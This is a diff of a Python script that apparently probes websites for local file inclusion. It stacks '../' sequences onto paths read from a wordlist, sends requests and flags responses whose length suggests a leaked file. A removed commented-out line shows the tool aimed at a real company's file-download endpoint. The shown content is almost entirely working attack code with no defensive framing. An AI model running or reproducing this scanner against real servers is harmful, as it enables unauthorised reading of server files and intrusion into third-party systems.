@@ -11,7 +11,6 @@ def main():
     resoru = input("Set the Resource >")
     print("Resource {}\n--------------------------------------------------------".format(resoru))
     auto = bool(int(input("Set the AUTO mode [0] for False, [1] True >")))
-#    url = ("https://www.arco.nl/download.php?file=./product_info/")
     url = ("{}".format(uwuurl+resoru)) #jeez + is so enough
     global Length_check
     le_url_check = url+"Stalin_is_my_Daddy.php"
@@ -69,11 +68,7 @@ def main():
                             check_na =len((dot+path).split('\n')[0])
                             whole = (url+dot+path).split('\n')[0]
                         status = a_request(whole,check_na)
-                        #if status == 1:
-                        #    print("\n\t[!]====================[BUG]==================[!]\n")
-                        #    print("[+] : "+whole)
-                        #elif status == 0:
-                        #    pass
+ 
             except:
                 print("Exiting...")
                 pass
@@ -82,15 +77,6 @@ def main():
         auto_true(url)
 def auto_true(url):                ########################################
     print("im in auto fun now")
-    #vul = w_url(url,auto)
-    #curl#vul = a_request(curl)
-    #if vul == 1:
-        #print("\n\t[!]====================[BUG]==================[!]\n")
-        #print("[+]a leak was found at {} \n".format(url))
-    #elif vul == 0:
-        #print("[-] : {}".format(url))
-
-        #pass
 
     try:
         for dots in range(1,10):
@@ -103,26 +89,6 @@ def auto_true(url):                ########################################
                 status = a_request(whole,len_check)
     except:
         print("An error trying to get the uri")
-#def w_url(url,auto):
-    #if auto == False :
-    #    return url   #the cool useless thing that i wont remove uwu
-    #else:
-    #    try:
-            #for dots in range(1,10):
-            #    dot = "../" * dots
-            #    f = open("LFI.txt","r+")
-            #    for line in f:
-                #    check_na =len((dot+line).split('\n')[0])
-                #    whole = (url+dot+line).split('\n')[0]
-                    #print(whole)
-            #        status = a_request(whole,check_na)
-            #        if status == 1:
-                    #    return 1
-                        #print("LFI >>> "+whole)
-                #    elif status == 0:
-                        #return
-        #except:
-            #print("An error trying to get the uri")
 def a_request(aurl,len_check): #,len_check ##(aurl)
     req = requests.get(aurl) ##note ?? remember that the https or http is importen for the requests lib ! add it yourself
     global Length_check
